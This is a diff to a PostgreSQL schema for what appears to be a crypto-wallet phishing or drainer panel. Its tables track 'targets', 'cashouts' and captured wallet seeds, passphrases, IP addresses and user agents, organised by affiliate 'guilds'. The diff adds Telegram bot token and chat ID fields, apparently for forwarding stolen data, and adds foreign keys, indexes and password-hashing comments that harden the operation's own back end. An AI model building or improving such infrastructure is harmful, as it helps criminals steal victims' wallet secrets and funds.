@@ -16,7 +16,7 @@ DROP TABLE IF EXISTS public.admins CASCADE;
 CREATE TABLE public.users (
     username text NOT NULL,
     userid text,
-    password text,
+    password text, -- Should store a salted hash, not plain text
     rank text,
     starting_page text,
     guild text
@@ -100,44 +100,6 @@ ALTER TABLE public.cashouts_id_seq OWNER TO postgres;
 ALTER SEQUENCE public.cashouts_id_seq OWNED BY public.cashouts.id;
 
 
---
--- Name: captured; Type: TABLE; Schema: public; Owner: postgres
---
-
-CREATE TABLE public.captured (
-    id integer NOT NULL,
-    seed text,
-    wallet_type text,
-    passphrase text,
-    user_agent text,
-    ip_address text,
-    date_captured timestamp without time zone,
-    guild text
-);
-
-
-ALTER TABLE public.captured OWNER TO postgres;
-
---
--- Name: captured_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
---
-
-CREATE SEQUENCE public.captured_id_seq
-    AS integer
-    START WITH 1
-    INCREMENT BY 1
-    NO MINVALUE
-    NO MAXVALUE
-    CACHE 1;
-
-
-ALTER TABLE public.captured_id_seq OWNER TO postgres;
-
---
--- Name: captured_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
---
-
-ALTER SEQUENCE public.captured_id_seq OWNED BY public.captured.id;
 
 
 --
@@ -155,10 +117,6 @@ ALTER TABLE ONLY public.cashouts ALTER COLUMN id SET DEFAULT nextval('public.cas
 
 
 --
--- Name: captured id; Type: DEFAULT; Schema: public; Owner: postgres
---
-
-ALTER TABLE ONLY public.captured ALTER COLUMN id SET DEFAULT nextval('public.captured_id_seq'::regclass);
 
 
 --
@@ -186,11 +144,6 @@ ALTER TABLE ONLY public.cashouts
 
 
 --
--- Name: captured captured_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
---
-
-ALTER TABLE ONLY public.captured
-    ADD CONSTRAINT captured_pkey PRIMARY KEY (id);
 
 
 --
@@ -275,7 +228,9 @@ ALTER TABLE ONLY public.captureddata
 
 CREATE TABLE public.guildsettings (
     guild text NOT NULL,
-    hideseed boolean
+    hideseed boolean,
+    telegram_bot_token text,
+    telegram_chat_id text
 );
 
 
@@ -295,7 +250,7 @@ ALTER TABLE ONLY public.guildsettings
 
 CREATE TABLE public.admins (
     username text NOT NULL,
-    password text,
+    password text, -- Should store a salted hash, not plain text
     guild text DEFAULT 'default'::text
 );
 
@@ -308,6 +263,27 @@ ALTER TABLE public.admins OWNER TO postgres;
 
 ALTER TABLE ONLY public.admins
     ADD CONSTRAINT admins_pkey PRIMARY KEY (username);
+
+--
+-- Foreign Keys
+--
+
+ALTER TABLE ONLY public.targets
+    ADD CONSTRAINT targets_belongsto_fkey FOREIGN KEY (belongsto) REFERENCES public.users(username) ON DELETE CASCADE;
+
+ALTER TABLE ONLY public.cashouts
+    ADD CONSTRAINT cashouts_username_fkey FOREIGN KEY (username) REFERENCES public.users(username) ON DELETE SET NULL;
+
+ALTER TABLE ONLY public.captureddata
+    ADD CONSTRAINT captureddata_targetid_fkey FOREIGN KEY (targetid) REFERENCES public.targets(id) ON DELETE CASCADE;
+
+--
+-- Indexes
+--
+
+CREATE INDEX targets_belongsto_idx ON public.targets USING btree (belongsto);
+CREATE INDEX cashouts_username_idx ON public.cashouts USING btree (username);
+CREATE INDEX captureddata_targetid_idx ON public.captureddata USING btree (targetid);
 
 
 --
